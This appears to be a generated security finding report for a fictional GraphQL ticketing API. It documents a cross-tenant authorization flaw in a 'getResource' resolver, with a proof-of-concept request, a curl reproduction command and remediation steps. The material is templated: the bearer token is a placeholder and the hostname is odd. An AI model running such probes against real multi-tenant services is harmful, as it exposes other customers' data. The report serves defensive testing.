# Security Analysis Report
**System:** VenueCore Ticketing API
**Domain:** Event Management / Ticketing
**Example ID:** GQL-0299
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.3 | Semantic ambiguity (over-broad endpoint) on `getResource` — attacker from `tenant-cb42` reads ticketing records owned by `tenant-ade4` via over-broad ID resolver |

---

## Finding 1 — Insecure Design: Semantic Ambiguity / Over-Broad Endpoint (Pattern 3.3)

### Summary
The `getResource` resolver on VenueCore Ticketing API (`api.venuecore-ticketing-.example.com`) is semantically over-broad: it accepts any `resourceId` globally without constraining scope to the authenticated tenant. Per §5.0 Pattern 3.3, this creates semantic ambiguity — the endpoint's lack of explicit tenancy scope allows cross-tenant access. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Note on hostname:** The hostname `api.venuecore-ticketing-.example.com` contains a trailing dash. This is the exact value in context.txt and is used as-is.
**Note:** HAR request operation (`getResource`) and response JSON key (`getResource`) are consistent.
**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-cb42ade4"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 3.3 — Semantic ambiguity (over-broad endpoints) (Insecure Design)
**Affected resolver:** `getResource`
**Affected endpoint:** `POST https://api.venuecore-ticketing-.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-cb42`)**
```
POST https://api.venuecore-ticketing-.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-cb42

{"query": "query VulnerableOp { getResource(id: \"R-2299\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Cross-Tenant Ticketing Record Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-ade4",
      "ownerId": "other-user-cb42ade4",
      "data": {
        "sensitiveField": "CONFIDENTIAL-cb42ade4",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-cb42ade4` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.venuecore-ticketing-.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-cb42" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2299\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: tenantId: tenant-ade4 returned for tenant-cb42 caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. `getResource` resolver must scope lookup to JWT's `tenantId`: `if (resource.tenantId !== jwt.tenantId) throw ForbiddenError`.
2. Introduce explicit tenant-scoped resolvers instead of global ID lookups.
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
